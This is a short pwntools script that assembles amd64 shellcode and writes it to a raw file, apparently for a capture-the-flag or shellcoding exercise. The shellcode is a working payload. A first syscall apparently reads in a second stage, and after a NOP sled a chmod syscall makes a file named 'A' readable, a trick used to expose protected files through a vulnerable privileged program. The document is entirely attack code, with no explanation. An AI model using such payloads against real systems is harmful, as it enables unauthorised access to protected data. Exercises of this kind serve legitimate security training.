
from pwn import *
context.arch = "amd64"
context.terminal = ['multixterm', '-e']  # Attempting to use multixterm

my_sc = asm("""
    push rax
    pop rdi
    push rdx
    pop rsi
    syscall
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    push 0x41
    mov rdi, rsp
    mov sil, 0x4
    mov al, 0x5a
    syscall
"""
)
# display the bytes
print(disasm(my_sc))
print("len: %d",len(my_sc))
fd = open("ttt-raw","wb+")
fd.write(my_sc)
fd.close()